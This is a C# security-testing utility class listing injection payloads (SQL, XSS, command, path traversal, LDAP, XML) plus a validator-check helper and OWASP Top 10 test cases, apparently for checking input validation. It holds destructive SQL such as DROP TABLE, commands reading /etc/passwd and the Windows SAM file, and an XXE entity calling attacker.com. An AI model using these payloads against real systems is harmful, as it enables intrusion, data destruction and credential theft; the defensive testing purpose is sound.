using System;
using System.Collections.Generic;
using System.Linq;

namespace SmartWorkz.Web.Security
{
    /// <summary>
    /// Comprehensive security testing utilities for penetration testing and vulnerability assessment.
    /// Provides curated payloads for OWASP Top 10 vulnerabilities and validation helpers.
    /// </summary>
    public static class SecurityTestingUtilities
    {
        /// <summary>
        /// SQL injection payloads for testing input validation against SQL injection attacks.
        /// </summary>
        public static readonly IReadOnlyList<string> SqlInjectionPayloads = new[]
        {
            // Basic SQL injection patterns
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT NULL, NULL, NULL --",

            // Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND SLEEP(5) --",

            // Error-based SQL injection
            "' AND extractvalue(rand(),concat(0x3a,version())) --",
            "' AND updatexml(1,concat(0x7e,version()),1) --",

            // Boolean-based blind SQL injection
            "' AND 1=1 --",
            "' AND 1=2 --",

            // Stacked queries
            "'; SELECT * FROM users; --",
            "'; DELETE FROM users WHERE 1=1; --",

            // Encoded variants
            "%27 OR %271%27=%271",
            "\\' OR \\'1\\'=\\'1",

            // Comment variations
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "' or 1#",
            "' or 1/*",
        };

        /// <summary>
        /// XSS (Cross-Site Scripting) payloads for testing input validation against XSS attacks.
        /// </summary>
        public static readonly IReadOnlyList<string> XssPayloads = new[]
        {
            // Basic script injection
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",

            // Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",

            // JavaScript protocol
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<img src=\"javascript:alert('XSS')\">",

            // Style-based XSS
            "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
            "<div style=\"background-image:url('javascript:alert(\\\"XSS\\\")')\"></div>",

            // Form-based XSS
            "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",

            // Encoded variants
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",

            // Data URI
            "<img src=\"data:text/html,<script>alert('XSS')</script>\">",

            // SVG-based
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",

            // Meta refresh
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",

            // Base64 encoded
            "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">",
        };

        /// <summary>
        /// Command injection payloads for testing input validation against OS command injection.
        /// </summary>
        public static readonly IReadOnlyList<string> CommandInjectionPayloads = new[]
        {
            // Command chaining with semicolon
            "test; whoami",
            "test; id",
            "test; cat /etc/passwd",
            "test; ls -la",

            // Command chaining with pipes
            "test | whoami",
            "test | id",
            "test | cat /etc/passwd",

            // Command chaining with logical operators
            "test && whoami",
            "test && id",
            "test || whoami",
            "test || id",

            // Background execution
            "test & whoami",
            "test & id",

            // Command substitution
            "test `whoami`",
            "test $(whoami)",
            "test `id`",
            "test $(id)",

            // Windows-specific
            "test & dir",
            "test | dir",
            "test && dir",
            "test & ipconfig",
            "test & whoami",

            // Newline injection
            "test\nwhoami",
            "test\nid",

            // Carriage return
            "test\r\nwhoami",

            // Null byte
            "test\x00whoami",
        };

        /// <summary>
        /// Path traversal payloads for testing input validation against directory traversal attacks.
        /// </summary>
        public static readonly IReadOnlyList<string> PathTraversalPayloads = new[]
        {
            // Basic path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",

            // Deep traversal
            "../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",

            // URL encoded variants
            "%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5cwindows",
            "%252e%252e%252fetc%252fpasswd",

            // Double URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",

            // Backslash variants (Windows)
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

            // Mixed separators
            "..\\../..\\../etc/passwd",

            // Null byte injection
            "../../../etc/passwd%00.txt",
            "..\\..\\..\\windows\\win.ini%00.txt",

            // Unicode/UTF-8 encoding
            "..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd",

            // Double dot variations
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32",

            // With trailing slash
            "../../../etc/passwd/",
            "..\\..\\..\\windows\\system32\\",
        };

        /// <summary>
        /// LDAP injection payloads for testing input validation against LDAP injection attacks.
        /// </summary>
        public static readonly IReadOnlyList<string> LdapInjectionPayloads = new[]
        {
            // Basic LDAP injection
            "*",
            "*)(|(cn=*",
            "*))(&(cn=*",
            "*))(&(|(uid=*",

            // Blind LDAP injection
            "admin*",
            "admin*)(&",

            // Filter bypass
            "*",
            "admin))((|(uid=*",
        };

        /// <summary>
        /// XML injection payloads for testing input validation against XML-based attacks.
        /// </summary>
        public static readonly IReadOnlyList<string> XmlInjectionPayloads = new[]
        {
            // XXE (XML External Entity)
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><root>&xxe;</root>",

            // XML bomb
            "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",

            // XSLT injection
            "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><script>alert('XSS')</script></xsl:template></xsl:stylesheet>",
        };

        /// <summary>
        /// Validates that an input validation function correctly rejects known malicious payloads.
        /// </summary>
        /// <param name="validationFunc">The validation function to test (returns true if invalid/malicious)</param>
        /// <param name="payloads">Collection of payloads to test</param>
        /// <returns>True if all payloads are correctly rejected, false otherwise</returns>
        public static bool ValidateInputValidationService(
            Func<string, bool> validationFunc,
            IReadOnlyList<string> payloads)
        {
            if (validationFunc == null)
                throw new ArgumentNullException(nameof(validationFunc));

            if (payloads == null)
                throw new ArgumentNullException(nameof(payloads));

            // Test each payload - expecting all to be detected as malicious (true returned)
            return payloads.All(payload => validationFunc(payload));
        }

        /// <summary>
        /// Generates comprehensive OWASP Top 10 test cases for security testing.
        /// </summary>
        /// <returns>Enumerable of tuples containing (Category, Description, Payload)</returns>
        public static IEnumerable<(string Category, string Description, string Payload)> GenerateOWASPTestCases()
        {
            var testCases = new List<(string, string, string)>();

            // A01:2021 - Broken Access Control
            testCases.Add(("A01:2021 - Broken Access Control",
                "Direct object reference without authorization check",
                "/api/users/1"));
            testCases.Add(("A01:2021 - Broken Access Control",
                "Parameter tampering to escalate privileges",
                "role=admin&user_id=2"));

            // A02:2021 - Cryptographic Failures
            testCases.Add(("A02:2021 - Cryptographic Failures",
                "Weak password hashing detection",
                "md5('password')"));
            testCases.Add(("A02:2021 - Cryptographic Failures",
                "Unencrypted sensitive data transmission",
                "credit_card=1234567890123456"));

            // A03:2021 - Injection (SQL, NoSQL, Command, etc.)
            testCases.Add(("A03:2021 - Injection",
                "SQL Injection via WHERE clause",
                "' OR '1'='1"));
            testCases.Add(("A03:2021 - Injection",
                "Command Injection via system call",
                "; whoami"));
            testCases.Add(("A03:2021 - Injection",
                "LDAP Injection",
                "*)(|(uid=*"));

            // A04:2021 - Insecure Design
            testCases.Add(("A04:2021 - Insecure Design",
                "Missing rate limiting on login endpoint",
                "/login (repeated 1000 times)"));
            testCases.Add(("A04:2021 - Insecure Design",
                "Insecure direct object references",
                "/profile?user_id=2"));

            // A05:2021 - Security Misconfiguration
            testCases.Add(("A05:2021 - Security Misconfiguration",
                "Exposed debug information",
                "GET /debug/config"));
            testCases.Add(("A05:2021 - Security Misconfiguration",
                "Default credentials in use",
                "admin:admin"));

            // A06:2021 - Vulnerable and Outdated Components
            testCases.Add(("A06:2021 - Vulnerable and Outdated Components",
                "Known CVE in dependency",
                "Log4j JNDI injection"));
            testCases.Add(("A06:2021 - Vulnerable and Outdated Components",
                "Outdated cryptographic libraries",
                "OpenSSL 1.0.0"));

            // A07:2021 - Identification and Authentication Failures
            testCases.Add(("A07:2021 - Identification and Authentication Failures",
                "Weak password policy",
                "password123"));
            testCases.Add(("A07:2021 - Identification and Authentication Failures",
                "Session fixation vulnerability",
                "jsessionid=attacker_controlled_value"));

            // A08:2021 - Software and Data Integrity Failures
            testCases.Add(("A08:2021 - Software and Data Integrity Failures",
                "Insecure deserialization",
                "Base64encodedSerializedObject"));
            testCases.Add(("A08:2021 - Software and Data Integrity Failures",
                "Unsigned dependency",
                "unsigned_npm_package.tgz"));

            // A09:2021 - Logging and Monitoring Failures
            testCases.Add(("A09:2021 - Logging and Monitoring Failures",
                "Missing security event logging",
                "login_failure (not logged)"));
            testCases.Add(("A09:2021 - Logging and Monitoring Failures",
                "Inadequate monitoring of failed attempts",
                "100 failed login attempts (no alert)"));

            // A10:2021 - Server-Side Request Forgery (SSRF)
            testCases.Add(("A10:2021 - SSRF",
                "SSRF via image URL parameter",
                "image_url=http://localhost:8080/admin"));
            testCases.Add(("A10:2021 - SSRF",
                "SSRF via webhook URL",
                "webhook_url=http://127.0.0.1:6379/"));

            // XSS - Critical vulnerability not in top 10 but essential
            testCases.Add(("XSS - Cross-Site Scripting",
                "Reflected XSS in search",
                "<script>alert('XSS')</script>"));
            testCases.Add(("XSS - Cross-Site Scripting",
                "Stored XSS in comment",
                "<img onerror=alert('XSS')>"));

            // CSRF - Cross-Site Request Forgery
            testCases.Add(("CSRF - Cross-Site Request Forgery",
                "CSRF token missing",
                "POST /transfer (no csrf_token)"));
            testCases.Add(("CSRF - Cross-Site Request Forgery",
                "CSRF token not validated",
                "csrf_token=anything"));

            return testCases;
        }

        /// <summary>
        /// Gets payload statistics for reporting and analysis.
        /// </summary>
        /// <returns>Dictionary containing payload categories and their counts</returns>
        public static Dictionary<string, int> GetPayloadStatistics()
        {
            return new Dictionary<string, int>
            {
                { "SQL Injection", SqlInjectionPayloads.Count },
                { "XSS", XssPayloads.Count },
                { "Command Injection", CommandInjectionPayloads.Count },
                { "Path Traversal", PathTraversalPayloads.Count },
                { "LDAP Injection", LdapInjectionPayloads.Count },
                { "XML Injection", XmlInjectionPayloads.Count },
            };
        }

        /// <summary>
        /// Combines all available payloads into a single collection for comprehensive testing.
        /// </summary>
        /// <returns>All payloads from all categories</returns>
        public static IEnumerable<string> GetAllPayloads()
        {
            var allPayloads = new List<string>();
            allPayloads.AddRange(SqlInjectionPayloads);
            allPayloads.AddRange(XssPayloads);
            allPayloads.AddRange(CommandInjectionPayloads);
            allPayloads.AddRange(PathTraversalPayloads);
            allPayloads.AddRange(LdapInjectionPayloads);
            allPayloads.AddRange(XmlInjectionPayloads);
            return allPayloads;
        }
    }
}
